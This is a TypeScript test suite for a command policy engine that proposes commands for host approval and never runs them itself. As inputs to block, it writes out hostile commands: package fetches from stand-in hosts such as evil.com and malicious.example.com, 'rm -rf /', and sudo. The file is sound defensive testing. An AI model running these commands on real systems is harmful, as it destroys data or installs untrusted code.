/**
 * Phase 1 / Prompt 2 — Execution Boundary & Child Process Prohibition Test Suite.
 *
 * Verifies that:
 * 1. In-process live command execution is completely removed from CoMemor.
 * 2. CommandPolicyEngine source code contains zero imports of child_process.
 * 3. verify_fix returns structured command proposals with required confirmation metadata.
 * 4. Inline code execution flags (python -c, python3 -c, bun -e) are blocked by policy.
 * 5. Unvetted remote downloads (URLs in arguments) are blocked by policy.
 * 6. Destructive commands (rm, sudo, etc.) are permanently denied.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { CommandPolicyEngine } from '../../src/policy/commandPolicy.js';
import { MemoryService } from '../../src/core/memoryService.js';

function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'exec-boundary-test-'));
}

describe('Execution Boundary — No Child Process Spawning', () => {
  let tmpDir: string;
  let engine: CommandPolicyEngine;
  let service: MemoryService;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
    service = new MemoryService({
      memoryDir: path.join(tmpDir, '.agent-memory'),
      workspaceRoot: tmpDir,
    });
  });

  afterEach(() => {
    service.close();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('guarantees CommandPolicyEngine source has zero imports of child_process', () => {
    const policySourcePath = path.resolve(__dirname, '../../src/policy/commandPolicy.ts');
    const source = fs.readFileSync(policySourcePath, 'utf8');
    expect(source).not.toContain("from 'node:child_process'");
    expect(source).not.toContain("from 'child_process'");
    expect(source).not.toContain('require("child_process")');
    expect(source).not.toContain('require("node:child_process")');
  });

  it('never executes commands when verifyFix is called with dryRun=true', async () => {
    const result = await engine.verifyFix('npm test', true);
    expect(result.status).toBe('dry_run_allowed');
    expect(result.executedByServer).toBe(false);
    expect(result.requiresHostConfirmation).toBe(true);
    expect(result.exitCode).toBeUndefined();
    expect(result.stdout).toBeUndefined();
  });

  it('never executes commands when verifyFix is called with dryRun=false', async () => {
    const result = await engine.verifyFix('npm test', false);
    expect(result.status).toBe('pending_approval');
    expect(result.executedByServer).toBe(false);
    expect(result.requiresHostConfirmation).toBe(true);
    expect(result.approvalId).toBeDefined();
    expect(result.exitCode).toBeUndefined();
    expect(result.stdout).toBeUndefined();
  });

  it('never executes commands through MemoryService.verifyFix', async () => {
    const result = await service.verifyFix({
      command: 'npm test',
      dryRun: false,
    });
    expect(result.status).toBe('pending_approval');
    expect(result.executedByServer).toBe(false);
    expect(result.requiresHostConfirmation).toBe(true);
    expect(result.exitCode).toBeUndefined();
    expect(result.stdout).toBeUndefined();
  });

  it('returns complete structured proposal metadata on valid commands', async () => {
    const result = await engine.verifyFix('npm test -- --coverage', true);
    expect(result.proposedCommand).toBe('npm test -- --coverage');
    expect(result.parsed).toEqual({
      binary: 'npm',
      args: ['test', '--', '--coverage'],
    });
    expect(result.risk).toBe('low');
    expect(result.requiresHostConfirmation).toBe(true);
    expect(result.executedByServer).toBe(false);
  });
});

describe('Execution Boundary — Inline Code Execution Prohibition', () => {
  let tmpDir: string;
  let engine: CommandPolicyEngine;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('blocks python -c inline execution', () => {
    const result = engine.validateCommand('python -c "print(1)"');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Inline code execution flag (-c) is prohibited');
    expect(result.risk).toBe('high');
  });

  it('blocks python3 -c inline execution', () => {
    const result = engine.validateCommand('python3 -c "print(1)"');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Inline code execution flag (-c) is prohibited');
    expect(result.risk).toBe('high');
  });

  it('blocks bun -e inline evaluation', () => {
    const result = engine.validateCommand('bun -e "console.log(process.version)"');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Inline code evaluation flag (-e/--eval) is prohibited');
    expect(result.risk).toBe('high');
  });

  it('blocks bun --eval inline evaluation', () => {
    const result = engine.validateCommand('bun --eval "console.log(1)"');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('Inline code evaluation flag (-e/--eval) is prohibited');
    expect(result.risk).toBe('high');
  });
});

describe('Execution Boundary — Unvetted Remote Downloads & Destructive Commands', () => {
  let tmpDir: string;
  let engine: CommandPolicyEngine;

  beforeEach(() => {
    tmpDir = makeTmpDir();
    engine = new CommandPolicyEngine(tmpDir);
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('blocks commands containing http:// or https:// URLs in arguments', () => {
    const httpCmd = engine.validateCommand('npm install http://malicious.example.com/package.tgz');
    expect(httpCmd.allowed).toBe(false);
    expect(httpCmd.reason).toContain('Unvetted remote downloads and URLs are not permitted');

    const httpsCmd = engine.validateCommand('cargo build https://evil.com/crate.git');
    expect(httpsCmd.allowed).toBe(false);
    expect(httpsCmd.reason).toContain('Unvetted remote downloads and URLs are not permitted');
  });

  it('blocks destructive rm and sudo commands', () => {
    const rmResult = engine.validateCommand('rm -rf /');
    expect(rmResult.allowed).toBe(false);
    expect(rmResult.risk).toBe('high');

    const sudoResult = engine.validateCommand('sudo npm install');
    expect(sudoResult.allowed).toBe(false);
    expect(sudoResult.risk).toBe('high');
  });
});
